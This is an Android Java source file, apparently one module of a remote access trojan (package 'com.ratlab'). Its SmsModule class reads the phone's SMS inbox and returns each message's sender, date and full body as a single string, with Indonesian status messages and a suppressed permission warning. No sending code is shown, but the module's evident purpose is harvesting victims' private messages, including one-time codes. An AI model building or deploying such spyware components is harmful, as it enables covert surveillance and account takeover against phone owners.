package com.ratlab;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsModule {

    private final Context ctx;

    public SmsModule(Context ctx) {
        this.ctx = ctx;
    }

    @SuppressLint("MissingPermission")
    public String list(int limit) {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = ctx.getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c == null) return "Tidak bisa akses SMS";
            int n = 0;
            while (c.moveToNext() && n < limit) {
                String addr = c.getString(c.getColumnIndexOrThrow("address"));
                String body = c.getString(c.getColumnIndexOrThrow("body"));
                String date = c.getString(c.getColumnIndexOrThrow("date"));
                sb.append("[").append(date).append("] ").append(addr).append("\n");
                sb.append(body).append("\n---\n");
                n++;
            }
            c.close();
            return sb.length() == 0 ? "Kosong" : sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
